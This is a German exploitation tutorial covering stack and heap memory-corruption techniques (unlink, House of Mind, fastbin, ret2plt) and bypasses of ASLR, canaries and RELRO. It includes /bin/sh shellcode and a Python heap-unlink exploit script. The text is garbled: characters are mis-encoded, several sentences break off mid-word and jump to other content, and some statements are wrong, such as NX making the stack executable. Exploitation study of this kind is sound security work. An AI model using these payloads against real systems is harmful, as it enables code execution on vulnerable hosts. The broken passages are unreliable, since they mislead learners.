Die Adressen der auszuf√ºhrenden Funktionen sind derzeit hinter mehreren Strukturen versteckt, und schlie√ülich sind die Adressen, auf die sie zeigen, nicht die Adressen der Funktionen, sondern sie sind mit XOR verschl√ºsselt und mit einem zuf√§lligen Schl√ºssel verschoben. Daher ist dieser Angriffsvektor derzeit zumindest auf x86 und x64\_86 nicht sehr n√ºtzlich. 
Die Verschl√ºsselungsfunktion ist `PTR_MANGLE`. Andere Architekturen wie m68k, mips32, mips64, aarch64, arm, hppa... implementieren die Verschl√ºsselungsfunktion nicht, da sie das Gleiche zur√ºckgibt wie sie als Eingabe erhalten hat. Daher w√§ren diese Architekturen durch diesen Vektor angreifbar.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Heutzutage ist es sehr ungew√∂hnlich, dies auszunutzen.
{% endhint %}

**`Setjmp()`** erm√∂glicht das Speichern des Kontextes (der Register). 
**`Longjmp()`** erm√∂glicht das Wiederherstellen des Kontextes. 
Die gespeicherten Register sind: `EBX, ESI, EDI, ESP, EIP, EBP`. 
Das Problem ist, dass EIP und ESP durch die Funktion **`PTR_MANGLE`** √ºbergeben werden, sodass die anf√§llige Architektur dieselbe ist wie oben beschrieben. 
Sie sind n√ºtzlich f√ºr Fehlerbehebung oder Unterbrechungen. 
Aus dem, was ich gelesen habe, sind die anderen Register nicht gesch√ºtzt, sodass bei einem `call ebx`, `call esi` oder `call edi` innerhalb der aufgerufenen Funktion die Kontrolle √ºbernommen werden kann. Oder Sie k√∂nnten auch EBP √§ndern, um ESP zu √§ndern.

**VTable und VPTR in C++**

Jede Klasse hat eine **VTable**, die ein Array von **Zeigern auf Methoden** ist.

Jedes Objekt einer **Klasse** hat einen **VPtr**, der ein **Zeiger** auf das Array seiner Klasse ist. Der VPtr ist Teil des Headers jedes Objekts, sodass bei einer √úberschreibung des VPtr dieser auf eine Dummy-Methode zeigen k√∂nnte, sodass bei der Ausf√ºhrung einer Funktion der Shellcode aufgerufen wird.

## **Pr√§ventive Ma√ünahmen und Umgehungen**

**ASLR nicht so zuf√§llig**

PaX teilt den Adressraum des Prozesses in 3 Gruppen auf:

Code und initialisierte und nicht initialisierte Daten: .text, .data und .bss -> 16 Bits Entropie in der Variablen delta\_exec, diese Variable wird bei jedem Prozess zuf√§llig initialisiert und zu den Anfangsadressen addiert.

Speicher, der von mmap() und gemeinsam genutzten Bibliotheken zugewiesen wird -> 16 Bits, delta\_mmap

Der Stack -> 24 Bits, delta\_stack -> Tats√§chlich 11 (vom 10. bis zum 20. Byte einschlie√ülich) -> auf 16 Byte ausgerichtet -> 524.288 m√∂gliche reale Stackadressen

Umgebungsvariablen und Argumente verschieben sich weniger als ein Puffer im Stack.

**Return-into-printf**

Es handelt sich um eine Technik, bei der ein Puffer√ºberlauf in einen Formatierungsfehler umgewandelt wird. Dabei wird der EIP so ersetzt, dass er auf ein printf der Funktion zeigt, und als Argument wird eine manipulierte Formatierungszeichenkette √ºbergeben, um Informationen √ºber den Zustand des Prozesses zu erhalten.

**Angriff auf Bibliotheken**

Bibliotheken befinden sich an einer Position mit 16 Bits Zuf√§lligkeit = 65636 m√∂gliche Adressen. Wenn ein anf√§lliger Server fork() aufruft, wird der Speicheradressraum im Kindprozess geklont und bleibt intakt. Daher kann versucht werden, die usleep() Funktion der libc mit dem Argument "16" brute force anzugreifen, sodass, wenn sie l√§nger als normal zum Antworten braucht, diese Funktion gefunden wurde. Wenn Sie wissen, wo sich diese Funktion befindet, k√∂nnen Sie delta\_mmap erhalten und die anderen berechnen.

Die einzige M√∂glichkeit, sicherzustellen, dass ASLR funktioniert, besteht darin, eine 64-Bit-Architektur zu verwenden. Dort gibt es keine Brute-Force-Angriffe.

**StackGuard und StackShield**

**StackGuard** f√ºgt vor dem EIP -> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ein -> recv(), memcpy(), read(), bcoy() sind immer noch anf√§llig und sch√ºtzt nicht das EBP.

**StackShield** ist aufw√§ndiger als StackGuard.

Es speichert alle R√ºckgabeadressen in einer Tabelle (Global Return Stack), sodass der √úberlauf keinen Schaden anrichtet. Au√üerdem k√∂nnen beide Adressen verglichen werden, um festzustellen, ob ein √úberlauf stattgefunden hat.

Die R√ºckgabeadresse kann auch mit einem Grenzwert verglichen werden, sodass bekannt ist, wenn der EIP an einen anderen Ort als den √ºblichen wie den Datenbereich geht. Dies kann jedoch mit Ret-to-lib, ROPs oder ret2ret umgangen werden.

Wie Sie sehen k√∂nnen, sch√ºtzt StackShield auch keine lokalen Variablen.

**Stack Smash Protector (ProPolice) -fstack-protector**

Der Canary wird vor dem EBP platziert. Die lokalen Variablen werden neu angeordnet, sodass die Puffer an den h√∂chsten Positionen liegen und andere Variablen nicht √ºberschrieben werden k√∂nnen.

Dar√ºber hinaus wird eine sichere Kopie der √ºbergebenen Argumente √ºber dem Stapel (√ºber den lokalen Variablen) erstellt und diese Kopien als Argumente verwendet.

Es kann keine Arrays mit weniger als 8 Elementen oder Puffer, die Teil einer Benutzerstruktur sind, sch√ºtzen.

Der Canary ist eine zuf√§llige Zahl aus "/dev/urandom" oder andernfalls 0xff0a0000. Es wird in TLS (Thread Local Storage) gespeichert. Threads teilen sich denselben Speicherbereich, TLS ist ein Bereich, der globale oder statische Variablen f√ºr jeden Thread enth√§lt. Normalerweise werden diese vom Elternprozess kopiert, obwohl der Kindprozess diese Daten √§ndern k√∂nnte, ohne die des Elternprozesses oder anderer Kinder zu √§ndern. Das Problem besteht darin, dass, wenn fork() verwendet wird, aber kein neuer Canary erstellt wird, alle Prozesse (Eltern und Kinder) denselben Canary verwenden. In i386 wird es in gs:0x14 und in x86\_64 in fs:0x28 gespeichert.

Dieser Schutz lokalisiert Funktionen, die anf√§llige Puffer haben k√∂nnten, und f√ºgt ihnen am Anfang der Funktion Code hinzu, um den Canary zu setzen, und am Ende, um ihn zu √ºberpr√ºfen.

Die Funktion fork() erstellt eine exakte Kopie des Elternprozesses, daher kann bei einem Webserver, der fork() aufruft, ein Brute-Force-Angriff Byte f√ºr Byte durchgef√ºhrt werden, um den verwendeten Canary herauszufinden.

Wenn die Funktion execve() nach fork() verwendet wird, wird der Speicher √ºberschrieben und der Angriff ist nicht mehr m√∂glich. vfork() erm√∂glicht es, den Kindprozess auszuf√ºhren, ohne eine Kopie zu erstellen, bis der Kindprozess versucht zu schreiben, dann wird eine Kopie erstellt.

**Relocation Read-Only (RELRO)**
### Relro

**Relro (Read only Relocation)** beeinflusst die Speicherberechtigungen √§hnlich wie NX. Der Unterschied besteht darin, dass NX den Stack ausf√ºhrbar macht, w√§hrend RELRO bestimmte Dinge schreibgesch√ºtzt macht, sodass wir nicht darauf schreiben k√∂nnen. Der h√§ufigste Fall, bei dem dies ein Hindernis darstellt, ist die Verhinderung einer **`got`-Tabellen√ºberschreibung**, die sp√§ter behandelt wird. Die `got`-Tabelle enth√§lt Adressen f√ºr libc-Funktionen, damit die Bin√§rdatei wei√ü, welche Adressen sie hat und sie aufrufen kann. Schauen wir uns an, wie die Speicherberechtigungen f√ºr einen `got`-Tabelleneintrag f√ºr eine Bin√§rdatei mit und ohne Relro aussehen.

Mit Relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Ohne Relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
F√ºr die Bin√§rdatei **ohne Relro** k√∂nnen wir sehen, dass die `got`-Eintragsadresse f√ºr `fgets` `0x404018` ist. Wenn wir uns die Speicherzuordnungen ansehen, sehen wir, dass sie zwischen `0x404000` und `0x405000` liegt, was die Berechtigungen **`rw`** hat, was bedeutet, dass wir darauf lesen und schreiben k√∂nnen. F√ºr die Bin√§rdatei **mit Relro** sehen wir, dass die Adresse der `got`-Tabelle f√ºr die Ausf√ºhrung der Bin√§rdatei (pie ist aktiviert, daher √§ndert sich diese Adresse) `0x555555557fd0` ist. In der Speicherzuordnung dieser Bin√§rdatei liegt sie zwischen `0x0000555555557000` und `0x0000555555558000`, was den Speicherberechtigungen **`r`** entspricht, was bedeutet, dass wir nur daraus lesen k√∂nnen.

Also, wie umgehen wir das? Der typische Umgehungsweg, den ich verwende, besteht darin, einfach nicht in Speicherbereiche zu schreiben, die durch Relro schreibgesch√ºtzt werden, und **einen anderen Weg zu finden, um Codeausf√ºhrung zu erreichen**.

Beachten Sie, dass die Bin√§rdatei vor der Ausf√ºhrung die Adressen der Funktionen kennen muss:

* Lazy Binding: Die Adresse einer Funktion wird beim ersten Aufruf der Funktion gesucht. Daher muss die GOT w√§hrend der Ausf√ºhrung Schreibberechtigungen haben.
* Bind Now: Die Adressen der Funktionen werden zu Beginn der Ausf√ºhrung gel√∂st, danach werden schreibgesch√ºtzte Berechtigungen f√ºr sensible Abschnitte wie .got, .dtors, .ctors, .dynamic, .jcr erteilt. `` `** ``-z relro`**`y`**`-z now\`\*\*

Um zu √ºberpr√ºfen, ob ein Programm Bind Now verwendet, k√∂nnen Sie Folgendes tun:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Wenn die Bin√§rdatei im Speicher geladen wird und eine Funktion zum ersten Mal aufgerufen wird, wird zur PLT (Procedure Linkage Table) gesprungen. Von dort aus wird ein Sprung (jmp) zur GOT gemacht und festgestellt, dass dieser Eintrag nicht aufgel√∂st wurde (er enth√§lt eine Adresse nach der PLT). Daher wird der Runtime Linker oder rtfd aufgerufen, um die Adresse aufzul√∂sen und in der GOT zu speichern.

Wenn eine Funktion aufgerufen wird, wird die PLT aufgerufen, die die Adresse der GOT enth√§lt, in der die Funktion gespeichert ist. Dadurch wird der Fluss dorthin umgeleitet und die Funktion aufgerufen. Wenn jedoch die Funktion zum ersten Mal aufgerufen wird, enth√§lt die GOT den n√§chsten Befehl der PLT. Daher folgt der Fluss dem PLT-Code (rtfd) und ermittelt die Adresse der Funktion, speichert sie in der GOT und ruft sie auf.

Beim Laden einer Bin√§rdatei in den Speicher hat der Compiler angegeben, an welcher Offset die Daten platziert werden m√ºssen, die beim Ausf√ºhren des Programms geladen werden sollen.

Lazy Binding -> Die Adresse der Funktion wird beim ersten Aufruf der Funktion gesucht, daher hat die GOT Schreibberechtigungen, damit sie dort gespeichert werden kann und nicht erneut gesucht werden muss.

Bind now -> Die Adressen der Funktionen werden beim Laden des Programms gesucht und die Berechtigungen der Abschnitte .got, .dtors, .ctors, .dynamic, .jcr werden auf nur Lesen ge√§ndert. -z relro und -z now

Trotzdem sind die meisten Programme im Allgemeinen nicht mit diesen Optionen kompliziert, daher sind diese Angriffe immer noch m√∂glich.

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> Um festzustellen, ob BIND_NOW verwendet wird

Fortify Source -D_FORTIFY_SOURCE=1 oder =2

Versucht, unsichere Funktionen zu identifizieren, die unsicher von einer Stelle zur anderen kopieren, und ersetzt die Funktion durch eine sichere Funktion.

Zum Beispiel:
char buf[16];
strcpy(buf, source);

Es erkennt dies als unsicher und ersetzt dann strcpy() durch __strcpy_chk(), wobei die Gr√∂√üe des Puffers als maximale Kopiergr√∂√üe verwendet wird.

Der Unterschied zwischen =1 und =2 ist, dass:

Die zweite Option erlaubt es nicht, dass %n aus einem Abschnitt mit Schreibberechtigung stammt. Au√üerdem kann der Parameter f√ºr den direkten Zugriff auf Argumente nur verwendet werden, wenn die vorherigen verwendet wurden, d.h. %3$d kann nur verwendet werden, wenn zuvor %2$d und %1$d verwendet wurden.

Um die Fehlermeldung anzuzeigen, wird argv[0] verwendet. Wenn also die Adresse einer anderen Stelle (wie einer globalen Variablen) dort platziert wird, zeigt die Fehlermeldung den Inhalt dieser Variablen an. Seite 191

Ersatz f√ºr Libsafe

Aktiviert mit: LD_PRELOAD=/lib/libsafe.so.2
oder
"/lib/libsave.so.2" > /etc/ld.so.preload

Es werden unsichere Funktionsaufrufe durch sichere Funktionen ersetzt. Nicht standardisiert. (nur f√ºr x86, nicht f√ºr Kompilierungen mit -fomit-frame-pointer, nicht f√ºr statische Kompilierungen, nicht alle anf√§lligen Funktionen werden sicher und LD_PRELOAD funktioniert nicht in SUID-Bin√§rdateien).

ASCII Armored Address Space

Besteht darin, die gemeinsam genutzten Bibliotheken von 0x00000000 bis 0x00ffffff zu laden, damit immer ein Byte 0x00 vorhanden ist. Dies h√§lt jedoch kaum Angriffe auf und funktioniert besonders schlecht bei Little Endian.

ret2plt

Besteht darin, eine ROP (Return-Oriented Programming) durchzuf√ºhren, bei der die Funktion strcpy@plt (aus der plt) aufgerufen wird und auf den Eintrag in der GOT gezeigt wird, und das erste Byte der gew√ºnschten Funktion (system()) kopiert wird. Anschlie√üend wird dasselbe mit GOT+1 gemacht und das zweite Byte von system() kopiert... Schlie√ülich wird die in der GOT gespeicherte Adresse aufgerufen, die system() sein wird.

Falsches EBP

F√ºr Funktionen, die EBP als Register verwenden, um auf Argumente zu zeigen, muss das EBP ebenfalls ge√§ndert werden, um auf einen Speicherbereich zu zeigen, der zwei beliebige Bytes und dann die Adresse von &"/bin/sh" enth√§lt, nachdem der EIP ge√§ndert wurde, um auf system() zu zeigen.

Chroot-K√§fige

debootstrap -arch=i386 hardy /home/user -> Installiert ein grundlegendes System in einem bestimmten Unterverzeichnis

Ein Administrator kann aus einem solchen K√§fig ausbrechen, indem er mkdir foo; chroot foo; cd .. ausf√ºhrt.

Code-Instrumentierung

Valgrind -> Sucht nach Fehlern
Memcheck
RAD (Return Address Defender)
Insure++

## 8 Heap Overflows: Grundlegende Exploits

Zugewiesener Chunk

prev_size |
size | -Header
*mem | Daten

Freier Chunk

prev_size |
size |
*fd | Zeiger auf vorherigen Chunk
*bk | Zeiger auf n√§chsten Chunk -Header
*mem | Daten

Die freien Chunks sind in einer doppelt verketteten Liste (bin) und es d√ºrfen niemals zwei aufeinanderfolgende freie Chunks vorhanden sein (sie werden zusammengef√ºhrt).

In "size" gibt es Bits, um anzuzeigen: ob der vorherige Chunk verwendet wird, ob der Chunk √ºber mmap() zugewiesen wurde und ob der Chunk zum prim√§ren Arena geh√∂rt.

Wenn ein Chunk freigegeben wird und benachbarte Chunks frei sind, werden diese durch die Makro unlink() fusioniert und der gr√∂√üere neue Chunk wird an frontlink() √ºbergeben, um ihn in den entsprechenden Bin einzuf√ºgen.

unlink(){
BK = P->bk; -> BK des neuen Chunks ist derjenige, den der zuvor freie Chunk hatte
FD = P->fd; -> FD des neuen Chunks ist derjenige, den der zuvor freie Chunk hatte
FD->bk = BK; -> BK des n√§chsten Chunks zeigt auf den neuen Chunk
BK->fd = FD; -> FD des vorherigen Chunks zeigt auf den neuen Chunk
}

Daher, wenn es uns gelingt, P->bk mit der Adresse eines Shellcodes und P->fd mit der Adresse eines Eintrags in der GOT oder DTORS minus 12 zu √§ndern, wird Folgendes erreicht:

BK = P->bk = &shellcode
FD = P->fd = &__dtor_end__ - 12
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

Dadurch wird beim Verlassen des Programms der Shellcode ausgef√ºhrt.

Au√üerdem schreibt die vierte Anweisung von unlink() etwas und der Shellcode muss daf√ºr vorbereitet sein:

BK->fd = FD -> *((&shellcode + 8) = (&__dtor_end__ - 12) -> Dies f√ºhrt dazu, dass 4 Bytes ab dem 8. Byte des Shellcodes geschrieben werden, daher muss der erste Befehl des Shellcodes ein jmp sein, um dies zu √ºberspringen und zu den Nops zu gelangen, die zum Rest des Shellcodes f√ºhren.

Daher wird der Exploit erstellt:

In den Buffer1 wird der Shellcode eingef√ºgt, beginnend mit einem jmp, damit er zu den Nops oder zum Rest des Shellcodes gelangt.

Nach dem Shellcode wird F√ºllmaterial eingef√ºgt, bis zum prev_size- und size-Feld des n√§chsten Chunks. An diesen Stellen werden 0xfffffff0 (um das prev_size zu √ºberschreiben, damit das Bit angezeigt wird, dass es frei ist) und "-4" (0xfffffffc) in die size eingef√ºgt (damit, wenn im dritten Chunk √ºberpr√ºft wird, ob der zweite frei ist, tats√§chlich zum modifizierten prev_size gegangen wird, der ihm sagt, dass er frei ist) -> Dadurch wird, wenn free() aufgerufen wird, zur size des dritten Chunks gegangen, aber tats√§chlich zum zweiten - 4 gegangen und gedacht, dass der zweite Chunk frei ist. Und dann wird unlink() aufgerufen.

Beim Aufruf von unlink() wird f√ºr P->fd die ersten Daten des zweiten Chunks verwendet, daher wird dort die Adresse eingef√ºgt, die √ºbers
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Es ist wichtig, dass das Bit, das angibt, dass der vorherige Chunk frei ist, auf 1 gesetzt ist**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, damit der "size" des dritten Chunks 4 Bytes dahinter liegt (zeigt auf prev\_size), da dort √ºberpr√ºft wird, ob der zweite Chunk frei ist**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Im Payload f√ºgen wir am Anfang 8 Bytes Padding hinzu**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse von free() in plt-12 (wird √ºberschrieben, um das Shellcode beim zweiten Aufruf von free() auszuf√ºhren)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Wie bereits erw√§hnt, beginnt das Payload mit 8 Bytes Padding**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Der zweite Chunk wird modifiziert, got\_free zeigt auf die Adresse, an der addr\_sc + 12 gespeichert wird**

**os.system("./8.3.o " + payload)**

**unset() in umgekehrter Reihenfolge freigeben (Wargame)**

Wir kontrollieren 3 aufeinanderfolgende Chunks und geben sie in umgekehrter Reihenfolge frei.

In diesem Fall:

Im Chunk c wird der Shellcode platziert.

Der Chunk a wird verwendet, um das b zu √ºberschreiben, so dass das Bit PREV\_INUSE im Size deaktiviert wird und der Chunk a als frei betrachtet wird.

Dar√ºber hinaus wird im Header b der Size so √ºberschrieben, dass er -4 betr√§gt.

Dann denkt das Programm, dass "a" frei und in einem Bin ist, und ruft unlink() auf, um es zu entkoppeln. Da jedoch der PREV\_SIZE-Header -4 betr√§gt, denkt es, dass der "a"-Chunk tats√§chlich bei b+4 beginnt. Das hei√üt, es wird unlink() auf einen Chunk durchgef√ºhrt, der bei b+4 beginnt, sodass der Pointer "fd" bei b+12 und der Pointer "bk" bei b+16 liegt.

Auf diese Weise k√∂nnen wir die Adresse der Shellcode in bk und die Adresse der Funktion "puts()" -12 in fd platzieren, um unseren Payload zu erstellen.

**Frontlink-Technik**

Frontlink wird aufgerufen, wenn etwas freigegeben wird und keiner seiner benachbarten Chunks frei ist. Anstatt unlink() aufzurufen, wird direkt frontlink() aufgerufen.

N√ºtzliche Schwachstelle, wenn das angegriffene malloc nie freigegeben (free()) wird.

Ben√∂tigt:

Einen Puffer, der mit der Eingabefunktion √ºberlaufen kann.

Einen Puffer, der neben diesem freigegeben wird und dessen fd-Feld in seinem Header durch den √úberlauf des vorherigen Buffers ge√§ndert wird.

Einen Puffer, der mit einer Gr√∂√üe gr√∂√üer als 512, aber kleiner als der vorherige Puffer freigegeben wird.

Einen Puffer, der vor Schritt 3 deklariert wird und es erm√∂glicht, den prev\_size dieses Puffers zu √ºberschreiben.

Auf diese Weise k√∂nnen wir in zwei mallocs unkontrolliert und in einem kontrollierten Exploit √ºberschreiben und nur einer wird freigegeben.

**Double free() Schwachstelle**

Wenn free() zweimal mit demselben Zeiger aufgerufen wird, gibt es zwei Bins, die auf dieselbe Adresse zeigen.

Wenn wir einen erneut verwenden m√∂chten, wird er problemlos zugewiesen. Wenn wir einen anderen verwenden m√∂chten, wird ihm derselbe Speicherplatz zugewiesen, sodass die "fd" und "bk" Pointer mit den Daten gef√§lscht werden, die die vorherige Zuweisung schreibt.

**After free()**

Ein zuvor freigegebener Zeiger wird erneut ohne Kontrolle verwendet.

## **8 Heap-√úberl√§ufe: Fortgeschrittene Exploits**

Die Techniken Unlink() und FrontLink() wurden ge√§ndert, indem die Funktion unlink() modifiziert wurde.

**The house of mind**

Es ist nur ein Aufruf von free() erforderlich, um beliebigen Code auszuf√ºhren. Es ist wichtig, einen zweiten Chunk zu finden, der von einem vorherigen √ºberlaufen und freigegeben werden kann.

Ein Aufruf von free() f√ºhrt zu einem Aufruf von public\_fREe(mem), der Folgendes ausf√ºhrt:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Gibt einen Zeiger auf die Adresse zur√ºck, an der der Chunk beginnt (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] wird das Feld size mit dem Bit NON\_MAIN\_ARENA √ºberpr√ºft, das ge√§ndert werden kann, um die √úberpr√ºfung auf true zu setzen und heap\_for\_ptr() auszuf√ºhren, das ein "and" auf "mem" anwendet und die 2,5 am wenigsten signifikanten Bytes auf 0 setzt (in unserem Fall von 0x0804a000 auf 0x08000000) und auf 0x08000000->ar\_ptr zugreift (als ob es ein struct heap\_info w√§re).

Auf diese Weise k√∂nnen wir einen Chunk beispielsweise bei 0x0804a000 kontrollieren und ein Chunk bei **0x081002a0** freigegeben wird, k√∂nnen wir zur Adresse 0x08100000 gelangen und dort schreiben, zum Beispiel **0x0804a000**. Wenn dieser zweite Chunk freigegeben wird, wird festgestellt, dass heap\_for\_ptr(ptr)->ar\_ptr den Wert enth√§lt, den wir in 0x08100000 geschrieben haben (da er auf 0x081002a0 das zuvor erw√§hnte "and" anwendet und von dort die ersten 4 Bytes, den ar\_ptr-Wert, abruft).

Auf diese Weise wird \_int\_free(ar\_ptr, mem) aufgerufen, d.h. **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Wie wir zuvor gesehen haben, k√∂nnen wir den Wert von av kontrollieren, da er das ist, was wir in den freizugebenden Chunk schreiben.

Wie unsorted\_chunks definiert ist, wissen wir, dass:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Daher wird, wenn wir in av->bins\[2] den Wert von \_\_DTOR\_END\_\_-12 schreiben, in der letzten Anweisung \_\_DTOR\_END\_\_ die Adresse des zweiten Chunks geschrieben.

Das hei√üt, im ersten Chunk m√ºssen wir am Anfang mehrmals die Adresse von \_\_DTOR\_END\_\_-12 schreiben, weil av->bins\[2] von dort abgeleitet wird.

An der Adresse, an der die Adresse des zweiten Chunks mit den letzten 5 Nullen liegt, m√ºssen wir die Adresse dieses ersten Chunks schreiben, damit heap\_for\_ptr() denkt, dass ar\_ptr am Anfang des ersten Chunks liegt und av->bins\[2] von dort abruft.

Im zweiten Chunk und dank des ersten √ºberschreiben wir prev\_size mit einem Sprungbef
Diese Technik ist nicht mehr anwendbar, da fast der gleiche Patch wie f√ºr unlink angewendet wurde. Es wird √ºberpr√ºft, ob die neue Adresse, auf die gezeigt wird, auch auf sie zeigt.

**Fastbin**

Es ist eine Variante von The House of Mind.

Wir m√∂chten den folgenden Code ausf√ºhren, der nach der ersten √úberpr√ºfung der Funktion \_int\_free() erreicht wird:

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> wobei fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Auf diese Weise wird, wenn es in "fb" eine Funktion in der GOT gibt, an dieser Adresse die Adresse des √ºberschriebenen Chunks stehen. Daf√ºr muss die Arena in der N√§he der dtors-Adressen liegen. Genauer gesagt muss av->max\_fast an der Adresse stehen, die wir √ºberschreiben m√∂chten.

Da wir mit The House of Mind gesehen haben, dass wir die Position von av kontrollieren k√∂nnen.

Wenn wir also im Feld size eine Gr√∂√üe von 8 + NON\_MAIN\_ARENA + PREV\_INUSE setzen, gibt uns fastbin\_index() fastbins\[-1\] zur√ºck, das auf av->max\_fast zeigt.

In diesem Fall wird av->max\_fast die Adresse sein, die √ºberschrieben wird (nicht die, auf die gezeigt wird, sondern diese Position wird √ºberschrieben).

